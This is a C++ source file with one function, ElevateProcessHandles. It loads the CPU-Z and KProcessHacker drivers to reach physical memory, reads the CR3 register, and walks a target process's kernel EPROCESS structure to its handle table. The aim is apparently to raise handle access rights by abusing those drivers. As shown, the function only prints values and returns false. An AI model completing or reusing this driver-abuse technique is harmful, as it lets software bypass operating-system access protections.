#include "jobHandlers.h"

/// <summary> Enumerate a processes handles </summary>
/// <param name="processID"> Process PID </param>
/// <returns></returns>
bool ElevateProcessHandles(JOBDESCRIPTOR* job)
{
	CpuzDrvr cpuz = CpuzDrvr();
	KProcessHacker kph = KProcessHacker();
	
	cpuz.InitDriver();
	kph.InitDriver();
	if (!kph.InitPhysicalMemory()) return false;

	// Reading CR3 register gives the directory base of this process
	//-------------------------------------------------------------
	ULONG64 dirBase;
	if (!cpuz.ReadControlRegister(CR_3, &dirBase)) return false;

	// Get the eprocess structure of target process
	//---------------------------------------------
	void* processEprocess = util::ProcessEprocessVirtualAddress(job->Pid());
	processEprocess = util::TranslateVirtualAddress( (void*)dirBase, processEprocess, &kph);

	// Get the Object handle table of process
	//---------------------------------------------
	nt::HANDLE_TABLE handleTable;
	void* objectTableAddr = nullptr;
	if (!kph.ReadPhysicalAddr((void*)((uint64_t)processEprocess + EPROCESS_OBJECT_TABLE_OFFSET), 
							&objectTableAddr, sizeof(void*)))
		return false;
	objectTableAddr = util::TranslateVirtualAddress((void*)dirBase, objectTableAddr, &kph);

	if (!kph.ReadPhysicalAddr(objectTableAddr, &handleTable, sizeof(handleTable)))
		return false;

	// Enumerate process handles
	//---------------------------------------------
	std::vector<HANDLE_NEW_ACCESS> hlist = job->handlesList;
	for (int i = 0; i < hlist.size(); i++) {
		
		std::cout << "H val: " << std::hex << hlist[i].desiredAccess << std::endl;
	}
	
	
	std::cout << "Table code: " << std::hex << handleTable.TableCode << std::endl;

	system("pause");
	return false;
}